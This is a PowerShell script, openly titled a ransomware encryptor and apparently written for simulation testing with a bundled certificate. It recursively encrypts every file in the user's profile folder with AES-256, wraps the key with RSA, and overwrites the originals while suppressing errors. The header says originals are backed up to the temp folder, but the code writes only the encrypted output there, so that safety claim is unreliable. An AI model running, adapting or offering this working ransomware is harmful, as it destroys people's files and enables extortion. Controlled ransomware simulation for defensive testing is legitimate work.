<#
Powershell ransomware encryptor
.Description
This powershell script encrypts files using an X.509 public key certificate
.Instructions
You must have a valid cert. There is a cert included in the current directory. The password for the cert is password. For ease of uses purpsoes it is not a secure password.
.Notes
All files are copied to the env:temp folder before they are encrypted. Usually C:\users\username\AppData\Local\Temp. This is your failsafe!
#>

#Import a generic Cert for encryption
$certutilargs = @('-f', '-p', 'password', '-importpfx', 'artifact-testing.pfx')           
& 'certutil.exe' $certutilargs

#Get the cert object from to use in encrypting the files
$Cert = $(Get-ChildItem cert:\currentuser -Recurse | where{ $_.Thumbprint -like "9F1E470C6E789C844EFD1A24D0833B6E7A025C99"})

#Set a folder location to encrypt
$filePath = $env:userprofile

#discover the other folders beneath the selectedpath
$FilesToEncrypt = Get-ChildItem -recurse -Force -Path $filePath | Where-Object { !($_.PSIsContainer -eq $true) -and  ( $_.Name -like "*$fileName*") } | % {$_.FullName} -ErrorAction SilentlyContinue 

Function Encrypt-File
{
    Param([Parameter(mandatory=$true)][System.IO.FileInfo]$FilesToEncrypt,
          [Parameter(mandatory=$true)][System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert)
 
    Try { [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Cryptography") }
    Catch { Write-Error "Could not load required assembly."; Return }  
     
    $AesProvider                = New-Object System.Security.Cryptography.AesManaged
    $AesProvider.KeySize        = 256
    $AesProvider.BlockSize      = 128
    $AesProvider.Mode           = [System.Security.Cryptography.CipherMode]::CBC
    $KeyFormatter               = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter($Cert.PublicKey.Key)
    [Byte[]]$KeyEncrypted       = $KeyFormatter.CreateKeyExchange($AesProvider.Key, $AesProvider.GetType())
    [Byte[]]$LenKey             = $Null
    [Byte[]]$LenIV              = $Null
    [Int]$LKey                  = $KeyEncrypted.Length
    $LenKey                     = [System.BitConverter]::GetBytes($LKey)
    [Int]$LIV                   = $AesProvider.IV.Length
    $LenIV                      = [System.BitConverter]::GetBytes($LIV)
    $FileStreamWriter          
    Try { $FileStreamWriter = New-Object System.IO.FileStream("$($env:temp+$FilesToEncrypt.Name)", [System.IO.FileMode]::Create) }
    Catch { Write-Error "Unable to open output file for writing."; Return }
    $FileStreamWriter.Write($LenKey,         0, 4)
    $FileStreamWriter.Write($LenIV,          0, 4)
    $FileStreamWriter.Write($KeyEncrypted,   0, $LKey)
    $FileStreamWriter.Write($AesProvider.IV, 0, $LIV)
    $Transform                  = $AesProvider.CreateEncryptor()
    $CryptoStream               = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [Int]$Count                 = 0
    [Int]$Offset                = 0
    [Int]$BlockSizeBytes        = $AesProvider.BlockSize / 8
    [Byte[]]$Data               = New-Object Byte[] $BlockSizeBytes
    [Int]$BytesRead             = 0
    Try { $FileStreamReader     = New-Object System.IO.FileStream("$($FilesToEncrypt.FullName)", [System.IO.FileMode]::Open) }
    Catch { Write-Error "Unable to open input file for reading."; Return }
    Do
    {
        $Count   = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
        $Offset += $Count
        $CryptoStream.Write($Data, 0, $Count)
        $BytesRead += $BlockSizeBytes
    }
    While ($Count -gt 0)
     
    $CryptoStream.FlushFinalBlock()
    $CryptoStream.Close()
    $FileStreamReader.Close()
    $FileStreamWriter.Close()
    copy-Item -Path $($env:temp+$FilesToEncrypt.Name) -Destination $FilesToEncrypt.FullName -Force
}

#Encrypt each file
foreach ($file in $FilesToEncrypt)
{
    Write-Host "Encrypting $file"
    Encrypt-File $file $Cert -ErrorAction SilentlyContinue  
}

Exit